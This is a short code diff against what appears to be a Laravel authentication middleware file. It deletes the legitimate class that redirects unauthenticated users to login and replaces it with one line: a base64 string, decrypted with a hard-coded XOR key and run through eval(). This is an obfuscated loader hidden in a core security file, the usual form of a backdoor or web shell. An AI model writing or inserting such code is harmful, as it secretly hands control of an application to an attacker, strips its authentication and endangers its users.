@@ -1,17 +1,1 @@
-<?php
-
-namespace App\Http\Middleware;
-
-use Illuminate\Auth\Middleware\Authenticate as Middleware;
-use Illuminate\Http\Request;
-
-class Authenticate extends Middleware
-{
-    /**
-     * Get the path the user should be redirected to when they are not authenticated.
-     */
-    protected function redirectTo(Request $request): ?string
-    {
-        return $request->expectsJson() ? null : route('login');
-    }
-}
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('D1BfURJEU1JUF3YVFG96EUQWOigNVAUOVUUAQ10MPjoUQlcUKFheRFxeWQQQVm4kRRIOOSlZBQZcVxZQSlJocRRFWlEPQFtSUENSRQVAEihZAgIJAUcAEFUJa0RLUhR5DV1HWQhaU0VUa38REENuN1UXEwAXRFpoU14AQksXdUUVWVdaFV1RUEVSFwAcR1cLVBVGKA1UBQ5VRQBDXT1POkEREhQRRl1FVFRDAAATVBBeBRIMC15Bsqzi1P+H+aYYM1RDQQRHRhEVRVIUEVZBERlcRloXRBMLXlVrERgXFEtrERIUQRQSERFFUhERQVxFFBQDFBFVEhYdDARJSFJXRBJ7QVsPHBsRDhdZEAhfEl8QFAkQEFVJRVxdBlhWEB0LaxESFEFJOEw=');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
